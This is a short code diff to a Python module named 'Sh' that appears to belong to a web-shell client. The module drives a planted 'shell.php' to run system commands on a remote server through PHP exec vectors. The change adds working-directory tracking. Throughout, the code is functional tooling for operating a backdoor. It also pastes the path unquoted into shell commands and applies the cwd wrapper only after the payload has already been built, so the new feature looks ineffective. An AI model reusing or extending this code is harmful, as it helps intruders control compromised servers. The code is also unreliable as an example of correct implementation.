@@ -33,10 +33,14 @@ class Sh(Module):
                 "exec()"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"
                 }
             ]
+    
+        
+    
 
     def __init__( self, modhandler , url, password):
 
         self.payload  = None
+        self.cwd_vector = None
 
         modhandler.load('shell.php')
 
@@ -44,7 +48,7 @@ class Sh(Module):
         
         if self.payload == None:
             raise ModuleException("system.exec",  "Shell interpreter initialization failed")
-
+        
         
     def _probe( self ):
 
@@ -65,6 +69,7 @@ class Sh(Module):
         raise ModuleException("shell.sh",  "Shell interpreter loading failed")
                 
 
+
     def run( self, cmd, err_to_stdout = True, payload = None ):
         
         if not payload:
@@ -80,8 +85,24 @@ class Sh(Module):
             cmd     = cmd.split()[0]
             payload = payload % ( args, cmd )
         
+        if self.cwd_vector:
+            cmd = self.cwd_vector % (cmd)
+        
         return self.modhandler.load('shell.php').run(payload)
 
+
+    def cwd_handler (self, path, set_new_cwd=False):
+        
+        response = self.run("( [ -d '%s' ] && echo 1 ) || echo 0" % path)
+        
+        if response == '1':
+            if set_new_cwd:
+                self.cwd_vector = "cd %s && %s" % ( path, '%s' )
+                
+            return True
+        
+        return False
+        
 
 
     
